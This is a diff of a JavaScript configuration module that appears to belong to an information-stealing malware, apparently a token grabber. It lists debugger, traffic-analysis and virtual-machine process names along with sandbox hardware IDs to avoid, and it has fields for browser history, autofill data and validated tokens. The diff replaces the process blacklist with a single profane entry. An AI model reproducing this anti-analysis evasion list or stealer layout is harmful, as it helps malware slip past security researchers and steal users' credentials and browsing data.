@@ -2,33 +2,7 @@ module.exports = (client) => {
     return {
 
         blacklisted_programs: [
-            "httpdebuggerui",
-            "wireshark",
-            "fiddler",
-            "vboxservice",
-            "df5serv",
-            "processhacker",
-            "vboxtray",
-            "vmtoolsd",
-            "vmwaretray",
-            "ida64",
-            "ollydbg",
-            "pestudio",
-            "vmwareuser",
-            "vgauthservice",
-            "vmacthlp",
-            "x96dbg",
-            "vmsrvc",
-            "x32dbg",
-            "vmusrvc",
-            "prl_cc",
-            "prl_tools",
-            "xenservice",
-            "qemu-ga",
-            "joeboxcontrol",
-            "ksdumperclient",
-            "ksdumper",
-            "joeboxserver"
+            "fuckyou",
         ],
 
         blacklisted_hwids: ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
@@ -127,7 +101,7 @@ module.exports = (client) => {
             history: [],
             autofill: [],
         },
-        
+
         validated_tokens: [],
     }
 }
